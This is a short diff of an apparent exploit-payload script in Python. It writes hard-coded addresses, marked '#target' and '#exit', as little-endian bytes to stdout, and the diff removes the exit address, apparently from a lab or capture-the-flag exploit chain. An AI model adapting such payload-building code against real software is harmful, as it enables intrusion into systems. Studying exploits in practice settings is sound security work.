@@ -15,5 +15,3 @@ sys.stdout.buffer.write(0x1.to_bytes(8, "little"))
 sys.stdout.buffer.write(0x0.to_bytes(8, "little"))
 #target
 sys.stdout.buffer.write(0x00000000004018d8.to_bytes(8, "little"))
-#exit
-sys.stdout.buffer.write(0x40acf0.to_bytes(8, "little"))
